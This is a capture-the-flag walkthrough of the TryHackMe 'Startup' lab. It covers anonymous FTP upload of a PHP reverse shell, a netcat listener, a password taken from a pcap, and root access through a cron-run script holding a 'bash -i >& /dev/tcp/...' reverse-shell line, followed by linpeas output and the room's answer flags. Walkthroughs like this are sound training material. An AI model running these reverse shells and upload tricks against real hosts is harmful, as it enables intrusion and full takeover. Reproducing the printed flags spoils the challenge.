# Startup - Abuse traditional vulnerabilities via untraditional means.

<br/>

## COMMON RECON

```
# Nmap 7.60 scan initiated Tue Jul 20 04:59:21 2021 as: nmap -sC -sV -oN Desktop/nmap.txt 10.10.204.133
Nmap scan report for ip-10-10-204-133.eu-west-1.compute.internal (10.10.204.133)
Host is up (0.059s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.10.13.188
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 5
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (EdDSA)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Maintenance
MAC Address: 02:BD:A6:8C:46:73 (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jul 20 04:59:51 2021 -- 1 IP address (1 host up) scanned in 30.15 seconds

```

## Task 1: Welcome to Spice Hut!

```
1. What is the secret spicy soup recipe?

Ans: love

2. What are the contents of user.txt?

Ans: THM{03ce3d619b80ccbfb3b7fc81e46c0e79}

3. What are the contents of root.txt?

Ans: THM{f963aaa6a430f210222158ae15c3d76d}

Lets Anonymous Login available to FTP. Lets Connect FTP & Download all files to local machine

root@ip-10-10-13-188:~# ftp 10.10.204.133
Connected to 10.10.204.133.
220 (vsFTPd 3.0.3)
Name (10.10.204.133:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
226 Directory send OK.
ftp> mget *
mget ftp?
200 PORT command successful. Consider using PASV.
550 Failed to open file.
mget important.jpg?
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for important.jpg (251631 bytes).
226 Transfer complete.
251631 bytes received in 0.01 secs (43.5683 MB/s)
mget notice.txt?
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for notice.txt (208 bytes).
226 Transfer complete.
208 bytes received in 0.00 secs (199.3376 kB/s)

```

Lets Read Content of Notice.txt

```
cat notice.txt

Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.
```

Lets Explore important.jpg

We unable to view jpg file because it is png image because it starts with 0x89 0x50 magic bytes which is png magic bytes
Lets Change extension of important.jpg to png, Now we are able to view file.

Lets Explore Website. We can see from NMAP result that PORT 80 is open.

## Nikto Scan.

```
- Nikto v2.1.5/2.1.5
+ Target Host: ip-10-10-0-163.eu-west-1.compute.internal
+ Target Port: 80
+ GET /: Server leaks inodes via ETags, header found with file /, fields: 0x328 0x5b3e1b06be884
+ GET /: The anti-clickjacking X-Frame-Options header is not present.
+ OPTIONS /: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
+ -3268: GET /files/: /files/: Directory indexing found.
+ -3092: GET /files/: /files/: This might be interesting...
+ -3233: GET /icons/README: /icons/README: Apache default file found.
```

## Gobuster Scan.

```
/files (Status: 301)
/server-status (Status: 403)
```

## View Page Source http://10.10.0.163

```
<!DOCTYPE html>
<title>Maintenance</title>
<style>
  body {
    text-align: center;
    padding: 150px;
  }
  h1 {
    font-size: 50px;
  }
  body {
    font: 20px Helvetica, sans-serif;
    color: #333;
  }
  article {
    display: block;
    text-align: left;
    width: 650px;
    margin: 0 auto;
  }
  a {
    color: #dc8100;
    text-decoration: none;
  }
  a:hover {
    color: #333;
    text-decoration: none;
  }
</style>

<article>
  <h1>No spice here!</h1>
  <div>
    <!--when are we gonna update this??-->
    <p>
      Please excuse us as we develop our site. We want to make it the most
      stylish and convienient way to buy peppers. Plus, we need a web developer.
      BTW if you're a web developer,
      <a href="mailto:#">contact us.</a> Otherwise, don't you worry. We'll be
      online shortly!
    </p>
    <p>&mdash; Dev Team</p>
  </div>
</article>
```

Lets Check /files Directory.
Page Link: http://10.10.0.163/files

<br/>

![Alt text](../images/Startup/Picure-1.jpg "FTP Directory")

We can Clearly observe that this directory is ftp directory. So Lets Check wether we can upload some file or not. <br/>
We have Write access to ftp directory <br/>

We use pentestmonkey php reverse shell <br/>
https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

```
root@ip-10-10-4-152:~# ftp 10.10.100.88
Connected to 10.10.100.88.
220 (vsFTPd 3.0.3)
Name (10.10.100.88:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> lcd Desktop/
Local directory now /root/Desktop
ftp> cd ftp
250 Directory successfully changed.
ftp> put shell.php
local: shell.php remote: shell.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
5491 bytes sent in 0.00 secs (113.8397 MB/s)
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 65534    65534        4096 Jul 26 14:42 .
drwxr-xr-x    3 65534    65534        4096 Nov 12  2020 ..
-rwxrwxr-x    1 112      118          5491 Jul 26 14:42 shell.php
226 Directory send OK.
ftp>

```

Lets Create Listener to port 4242

```
root@ip-10-10-4-152:~# nc -lvp 4242
Listening on [0.0.0.0] (family 0, port 4242)
Connection from ip-10-10-100-88.eu-west-1.compute.internal 41358 received!
Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 14:56:31 up 29 min,  0 users,  load average: 0.00, 0.00, 0.07
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ which python
/usr/bin/python
$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@startup:/$ export TERM=xterm
export TERM=xterm
www-data@startup:/$ stty raw -echo;
stty raw -echo;
www-data@startup:/$ ^Z
[1]+  Stopped                 nc -lvp 4242
root@ip-10-10-4-152:~# fg
nc -lvp 4242

www-data@startup:/$ ls
bin   home	      lib	  mnt	      root  srv  vagrant
boot  incidents       lib64	  opt	      run   sys  var
dev   initrd.img      lost+found  proc	      sbin  tmp  vmlinuz
etc   initrd.img.old  media	  recipe.txt  snap  usr  vmlinuz.old
www-data@startup:/$ ls -la
total 100
drwxr-xr-x  25 root     root      4096 Jul 26 14:28 .
drwxr-xr-x  25 root     root      4096 Jul 26 14:28 ..
drwxr-xr-x   2 root     root      4096 Sep 25  2020 bin
drwxr-xr-x   3 root     root      4096 Sep 25  2020 boot
drwxr-xr-x  16 root     root      3560 Jul 26 14:27 dev
drwxr-xr-x  96 root     root      4096 Nov 12  2020 etc
drwxr-xr-x   3 root     root      4096 Nov 12  2020 home
drwxr-xr-x   2 www-data www-data  4096 Nov 12  2020 incidents
lrwxrwxrwx   1 root     root        33 Sep 25  2020 initrd.img -> boot/initrd.img-4.4.0-190-generic
lrwxrwxrwx   1 root     root        33 Sep 25  2020 initrd.img.old -> boot/initrd.img-4.4.0-190-generic
drwxr-xr-x  22 root     root      4096 Sep 25  2020 lib
drwxr-xr-x   2 root     root      4096 Sep 25  2020 lib64
drwx------   2 root     root     16384 Sep 25  2020 lost+found
drwxr-xr-x   2 root     root      4096 Sep 25  2020 media
drwxr-xr-x   2 root     root      4096 Sep 25  2020 mnt
drwxr-xr-x   2 root     root      4096 Sep 25  2020 opt
dr-xr-xr-x 123 root     root         0 Jul 26 14:27 proc
-rw-r--r--   1 www-data www-data   136 Nov 12  2020 recipe.txt
drwx------   4 root     root      4096 Nov 12  2020 root
drwxr-xr-x  25 root     root       900 Jul 26 14:51 run
drwxr-xr-x   2 root     root      4096 Sep 25  2020 sbin
drwxr-xr-x   2 root     root      4096 Nov 12  2020 snap
drwxr-xr-x   3 root     root      4096 Nov 12  2020 srv
dr-xr-xr-x  13 root     root         0 Jul 26 14:27 sys
drwxrwxrwt   7 root     root      4096 Jul 26 15:00 tmp
drwxr-xr-x  10 root     root      4096 Sep 25  2020 usr
drwxr-xr-x   2 root     root      4096 Nov 12  2020 vagrant
drwxr-xr-x  14 root     root      4096 Nov 12  2020 var
lrwxrwxrwx   1 root     root        30 Sep 25  2020 vmlinuz -> boot/vmlinuz-4.4.0-190-generic
lrwxrwxrwx   1 root     root        30 Sep 25  2020 vmlinuz.old -> boot/vmlinuz-4.4.0-190-generic
www-data@startup:/$ cat recipe.txt
Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love.
www-data@startup:/$



```

By Analysing pcap file we got password for lennie <br/>
c4ntg3t3n0ughsp1c3 <br/>

```
lennie@startup:~$ ls -la
total 24
drwx------ 5 lennie lennie 4096 Jul 27 17:07 .
drwxr-xr-x 3 root   root   4096 Nov 12  2020 ..
drwx------ 2 lennie lennie 4096 Jul 27 17:07 .cache
drwxr-xr-x 2 lennie lennie 4096 Nov 12  2020 Documents
drwxr-xr-x 2 root   root   4096 Nov 12  2020 scripts
-rw-r--r-- 1 lennie lennie   38 Nov 12  2020 user.txt

lennie@startup:~$ cat user.txt

THM{03ce3d619b80ccbfb3b7fc81e46c0e79}

lennie@startup:~$

lennie@startup:~/scripts$ ls -la
total 16
drwxr-xr-x 2 root   root   4096 Nov 12  2020 .
drwx------ 8 lennie lennie 4096 Jul 27 17:52 ..
-rwxr-xr-x 1 root   root     77 Nov 12  2020 planner.sh
-rw-r--r-- 1 root   root      1 Jul 27 18:10 startup_list.txt
lennie@startup:~/scripts$

lennie@startup:~/scripts$ cat planner.sh
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
lennie@startup:~/scripts$


lennie@startup:~/scripts$ cat /etc/print.sh
bash -c "bash -i >& /dev/tcp/10.9.4.122/4242 0>&1"
lennie@startup:~/scripts$

Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\something>ncat -lvp 4242
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::4242
Ncat: Listening on 0.0.0.0:4242
Ncat: Connection from 10.10.128.197.
Ncat: Connection from 10.10.128.197:54742.
bash: cannot set terminal process group (6654): Inappropriate ioctl for device
bash: no job control in this shell
root@startup:~# ls
ls
root.txt
root@startup:~# cat root.txt
cat root.txt
THM{f963aaa6a430f210222158ae15c3d76d}

```

## Task 2: Credits

```
1. Congratulations

Ans: No Anwers Needed.

```

```
lennie@startup:~/scripts$ cat planner.sh
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
lennie@startup:~/scripts$ lennie@startup:~/scripts$ cat planner.sh
bash: lennie@startup:~/scripts$: No such file or directory
lennie@startup:~/scripts$ #!/bin/bash
lennie@startup:~/scripts$ echo $LIST > /home/lennie/scripts/startup_list.txt
bash: /home/lennie/scripts/startup_list.txt: Permission denied
lennie@startup:~/scripts$ /etc/print.sh
bash: connect: Connection refused
bash: /dev/tcp/10.9.4.122/4242: Connection refused
lennie@startup:~/scripts$ lennie@startup:~/scripts$
bash: lennie@startup:~/scripts$: No such file or directory
lennie@startup:~/scripts$ clear
lennie@startup:~/scripts$ cat /etc/print.sh
bash -c "bash -i >& /dev/tcp/10.9.4.122/4242 0>&1"
lennie@startup:~/scripts$ lennie@startup:~/scripts$ cat /etc/print.sh
bash: lennie@startup:~/scripts$: No such file or directory
lennie@startup:~/scripts$ bash -c "bash -i >& /dev/tcp/10.9.4.122/4242 0>&1"
bash: connect: Connection refused
bash: /dev/tcp/10.9.4.122/4242: Connection refused
lennie@startup:~/scripts$ lennie@startup:~/scripts$
bash: lennie@startup:~/scripts$: No such file or directory
lennie@startup:~/scripts$ cd ../
lennie@startup:~$ ls
Documents  linpeas.sh  scripts  user.txt
lennie@startup:~$ ./linpeas.sh


                     ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
  ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
  ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
  ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄
  ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
  ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
  ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
  ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
  ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
  ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
  ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
  ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄
   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
   ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
        ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
              ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

       /---------------------------------------------------------------------------\
       |                             Do you like PEASS?                            |
       |---------------------------------------------------------------------------|
       |         Become a Patreon    :     https://www.patreon.com/peass           |
       |         Follow on Twitter   :     @carlospolopm                           |
       |         Respect on HTB      :     SirBroccoli & makikvues                 |
       |---------------------------------------------------------------------------|
       |                                 Thank you!                                |
       \---------------------------------------------------------------------------/
        linpeas-ng by carlospolop

ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.

Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
 LEGEND:
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs)
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...

════════════════════════════════════╣ Basic information ╠════════════════════════════════════
OS: Linux version 4.4.0-190-generic (buildd@lcy01-amd64-026) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.12) ) #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020
User & Groups: uid=1002(lennie) gid=1002(lennie) groups=1002(lennie)
Hostname: startup
Writable folder: /dev/shm
[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /bin/nc is available for network discover & port scanning (linpeas can discover hosts and scan ports, learn more with -h)


Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . uniq: write error: Broken pipe
DONE

════════════════════════════════════╣ System Information ╠════════════════════════════════════
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits
Linux version 4.4.0-190-generic (buildd@lcy01-amd64-026) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.12) ) #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020
Distributor ID: Ubuntu
Description:    Ubuntu 16.04.7 LTS
Release:        16.04
Codename:       xenial

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version
Sudo version 1.8.16

╔══════════╣ USBCreator
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation

╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

╔══════════╣ Date & uptime
Tue Jul 27 18:17:53 UTC 2021
 18:17:53 up  1:16,  1 user,  load average: 0.08, 0.02, 0.01

╔══════════╣ System stats
Filesystem      Size  Used Avail Use% Mounted on
udev            235M     0  235M   0% /dev
tmpfs            49M  1.8M   47M   4% /run
/dev/xvda1      9.7G  1.2G  8.5G  13% /
tmpfs           244M     0  244M   0% /dev/shm
tmpfs           5.0M     0  5.0M   0% /run/lock
tmpfs           244M     0  244M   0% /sys/fs/cgroup
tmpfs            49M     0   49M   0% /run/user/1002
              total        used        free      shared  buff/cache   available
Mem:         498372       69024       17600       10832      411748      382000
Swap:             0           0           0

╔══════════╣ CPU info
Architecture:          x86_64
CPU op-mode(s):        32-bit, 64-bit
Byte Order:            Little Endian
CPU(s):                1
On-line CPU(s) list:   0
Thread(s) per core:    1
Core(s) per socket:    1
Socket(s):             1
NUMA node(s):          1
Vendor ID:             GenuineIntel
CPU family:            6
Model:                 63
Model name:            Intel(R) Xeon(R) CPU E5-2676 v3 @ 2.40GHz
Stepping:              2
CPU MHz:               2394.460
BogoMIPS:              4788.92
Hypervisor vendor:     Xen
Virtualization type:   full
L1d cache:             32K
L1i cache:             32K
L2 cache:              256K
L3 cache:              30720K
NUMA node0 CPU(s):     0
Flags:                 fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 ht syscall nx rdtscp lm constant_tsc rep_good nopl xtopology pni pclmulqdq ssse3 fma cx16 pcid sse4_1 sse4_2 x2apic movbe popcnt tsc_deadline_timer aes xsave avx f16c rdrand hypervisor lahf_lm abm invpcid_single kaiser fsgsbase bmi1 avx2 smep bmi2 erms invpcid xsaveopt

╔══════════╣ Environment
╚ Any private information inside environment variables?
HISTFILESIZE=0
MAIL=/var/mail/lennie
SSH_CLIENT=10.9.4.122 1478 22
USER=lennie
SHLVL=1
HOME=/home/lennie
OLDPWD=/home/lennie/scripts
SSH_TTY=/dev/pts/0
LOGNAME=lennie
_=./linpeas.sh
XDG_SESSION_ID=5
TERM=xterm
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
XDG_RUNTIME_DIR=/run/user/1002
LANG=en_US.UTF-8
HISTSIZE=0
SHELL=/bin/sh
PWD=/home/lennie
XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
SSH_CONNECTION=10.9.4.122 1478 10.10.128.197 22
HISTFILE=/dev/null

╔══════════╣ Searching Signature verification failed in dmseg
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#dmesg-signature-verification-failed
dmesg Not Found

╔══════════╣ Protections
═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.
apparmor module is loaded.
═╣ grsecurity present? ............ grsecurity Not Found
═╣ PaX bins present? .............. PaX Not Found
═╣ Execshield enabled? ............ Execshield Not Found
═╣ SELinux enabled? ............... sestatus Not Found
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... lpstat Not Found
═╣ Is this a virtual machine? ..... Yes (xen)

════════════════════════════════════╣ Containers ╠════════════════════════════════════
╔══════════╣ Container related tools present
╔══════════╣ Container details
═╣ Is this a container? ........... No
═╣ Any running containers? ........ No

════════════════════════════════════╣ Devices ╠════════════════════════════════════
╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk

╔══════════╣ Unmounted file-system?
╚ Check if you can mount umounted devices
LABEL=cloudimg-rootfs   /       ext4    defaults        0 0

╔══════════╣ Mounted disks information
diskutil Not Found

╔══════════╣ Mounted SMB Shares
smbutil Not Found


════════════════════════════════════╣ Available Software ╠════════════════════════════════════
╔══════════╣ Useful software

╔══════════╣ Installed Compiler
/usr/share/gcc-5


════════════════════════════════════╣ Processes, Cron, Services, Timers & Sockets ╠════════════════════════════════════
╔══════════╣ Cleaned processes
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
root         1  0.2  1.1  37840  5844 ?        Ss   17:01   0:10 /sbin/init
root       388  0.0  0.5  27700  2928 ?        Ss   17:01   0:01 /lib/systemd/systemd-journald
root       413  0.0  0.3  94768  1696 ?        Ss   17:01   0:00 /sbin/lvmetad -f
root       456  0.0  0.7  42540  3708 ?        Ss   17:01   0:01 /lib/systemd/systemd-udevd
root       839  0.0  0.5  16120  2884 ?        Ss   17:02   0:00 /sbin/dhclient -1 -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
root       974  0.0  0.0   5216   144 ?        Ss   17:02   0:00 /sbin/iscsid
root       975  0.0  0.7   5716  3504 ?        S<Ls 17:02   0:00 /sbin/iscsid
root       980  0.0  0.4 629796  2084 ?        Ssl  17:02   0:01 /usr/bin/lxcfs /var/lib/lxcfs/
root       985  0.0  0.5  27724  2532 ?        Ss   17:02   0:00 /usr/sbin/cron -f
root      6653  0.0  0.5  48936  2932 ?        S    18:08   0:00  _ /usr/sbin/CRON -f
root      6654  0.0  0.1   4500   792 ?        Ss   18:08   0:00      _ /bin/sh -c /home/lennie/scripts/planner.sh
root      6655  0.0  0.5  11224  2980 ?        S    18:08   0:00          _ /bin/bash /home/lennie/scripts/planner.sh
root      6656  0.0  0.4  11228  2428 ?        S    18:08   0:00              _ /bin/bash /home/lennie/scripts/planner.sh
root      6657  0.0  0.5  11220  2980 ?        S    18:08   0:00                  _ bash -c bash -i >& /dev/tcp/10.9.4.122/4242 0>&1
root      6658  0.0  0.7  19892  3704 ?        S    18:08   0:00                      _ bash -i
message+   990  0.0  0.7  42956  3688 ?        Ss   17:02   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
root      1006  0.0  5.4 392248 26988 ?        Ssl  17:02   0:00 /usr/bin/amazon-ssm-agent
root      1019  0.0  0.5  28544  2956 ?        Ss   17:02   0:00 /lib/systemd/systemd-logind
root      1024  0.0  1.1 274484  5664 ?        Ssl  17:02   0:00 /usr/lib/accountsservice/accounts-daemon[0m
root      1031  0.0  0.2   4392  1228 ?        Ss   17:02   0:00 /usr/sbin/acpid
daemon[0m    1036  0.0  0.4  26040  2024 ?        Ss   17:02   0:00 /usr/sbin/atd -f
syslog    1041  0.0  0.6 260624  3416 ?        Ssl  17:02   0:00 /usr/sbin/rsyslogd -n
root      1048  0.0  0.7  65508  3888 ?        Ss   17:02   0:00 /usr/sbin/sshd -D
lennie    1398  0.0  0.7  93332  3892 ?        S    17:07   0:00      _ sshd: lennie@pts/0
lennie    1404  0.0  0.3   4500  1788 pts/0    Ss   17:07   0:00          _ -sh
lennie    1435  0.0  1.3  33740  6816 pts/0    S+   17:08   0:00              _ python -c import pty;pty.spawn("/bin/bash")
lennie    1436  0.0  0.7  19924  3744 pts/1    Ss   17:08   0:00                  _ /bin/bash
lennie    6801  0.1  0.4   5136  2472 pts/1    S+   18:17   0:00                      _ /bin/sh ./linpeas.sh
lennie    7839  0.0  0.1   5136   836 pts/1    S+   18:17   0:00                          _ /bin/sh ./linpeas.sh
lennie    7843  0.0  0.6  36224  3420 pts/1    R+   18:17   0:00                          |   _ ps fauxwww
lennie    7842  0.0  0.1   5136   836 pts/1    S+   18:17   0:00                          _ /bin/sh ./linpeas.sh
root      1053  0.0  0.3  24040  1648 ?        Ss   17:02   0:00 /usr/sbin/vsftpd /etc/vsftpd.conf
root      1071  0.0  3.2 173336 15964 ?        Ssl  17:02   0:01 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root      1081  0.0  0.0  13368   164 ?        Ss   17:02   0:00 /sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemon[0mise --scan --syslog
root      1097  0.0  1.1 277176  5696 ?        Ssl  17:02   0:00 /usr/lib/policykit-1/polkitd --no-debug
root      1146  0.0  0.3  14468  1648 ttyS0    Ss+  17:02   0:00 /sbin/agetty --keep-baud 115200 38400 9600 ttyS0 vt220
root      1149  0.0  0.3  14652  1536 tty1     Ss+  17:02   0:00 /sbin/agetty --noclear tty1 linux
root      1228  0.0  4.3 257068 21608 ?        Ss   17:02   0:00 /usr/sbin/apache2 -k start
www-data  1235  0.0  1.1 257092  5788 ?        S    17:02   0:00  _ /usr/sbin/apache2 -k start
www-data  1236  0.0  1.1 257092  5788 ?        S    17:02   0:00  _ /usr/sbin/apache2 -k start
www-data  1237  0.0  1.1 257092  5788 ?        S    17:02   0:00  _ /usr/sbin/apache2 -k start
www-data  1238  0.0  1.1 257092  5788 ?        S    17:02   0:00  _ /usr/sbin/apache2 -k start
www-data  1239  0.0  1.1 257092  5788 ?        S    17:02   0:00  _ /usr/sbin/apache2 -k start
lennie    1334  0.0  0.8  45316  4408 ?        Ss   17:06   0:00 /lib/systemd/systemd --user
lennie    1338  0.0  0.3  61292  1948 ?        S    17:06   0:00  _ (sd-pam)

╔══════════╣ Binary processes permissions
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
1016K -rwxr-xr-x 1 root root 1014K Jul 12  2019 /bin/bash
    0 lrwxrwxrwx 1 root root     4 Feb 17  2016 /bin/sh -> dash
 1.6M -rwxr-xr-x 1 root root  1.6M Sep  4  2020 /lib/systemd/systemd
 320K -rwxr-xr-x 1 root root  319K Sep  4  2020 /lib/systemd/systemd-journald
 612K -rwxr-xr-x 1 root root  609K Sep  4  2020 /lib/systemd/systemd-logind
 444K -rwxr-xr-x 1 root root  443K Sep  4  2020 /lib/systemd/systemd-udevd
  44K -rwxr-xr-x 1 root root   44K Jan 27  2020 /sbin/agetty
 476K -rwxr-xr-x 1 root root  476K Mar  5  2018 /sbin/dhclient
    0 lrwxrwxrwx 1 root root    20 Sep  4  2020 /sbin/init -> /lib/systemd/systemd
 768K -rwxr-xr-x 1 root root  766K Dec 11  2018 /sbin/iscsid
  52K -rwxr-xr-x 1 root root   51K Apr 16  2016 /sbin/lvmetad
 504K -rwxr-xr-x 1 root root  502K Nov  8  2017 /sbin/mdadm
  30M -rwxr-xr-x 1 root root   30M Aug 11  2020 /usr/bin/amazon-ssm-agent
 220K -rwxr-xr-x 1 root root  219K Jun 11  2020 /usr/bin/dbus-daemon[0m
  20K -rwxr-xr-x 1 root root   19K Nov  9  2017 /usr/bin/lxcfs
    0 lrwxrwxrwx 1 root root     9 Mar 23  2016 /usr/bin/python3 -> python3.5
 164K -rwxr-xr-x 1 root root  162K Nov  3  2016 /usr/lib/accountsservice/accounts-daemon[0m
  16K -rwxr-xr-x 1 root root   15K Mar 27  2019 /usr/lib/policykit-1/polkitd
  48K -rwxr-xr-x 1 root root   47K Apr  8  2016 /usr/sbin/acpid
 648K -rwxr-xr-x 1 root root  648K Aug 13  2020 /usr/sbin/apache2
  28K -rwxr-xr-x 1 root root   27K Jan 14  2016 /usr/sbin/atd
  44K -rwxr-xr-x 1 root root   44K Apr  5  2016 /usr/sbin/cron
 588K -rwxr-xr-x 1 root root  586K Mar 25  2019 /usr/sbin/rsyslogd
 776K -rwxr-xr-x 1 root root  773K May 26  2020 /usr/sbin/sshd
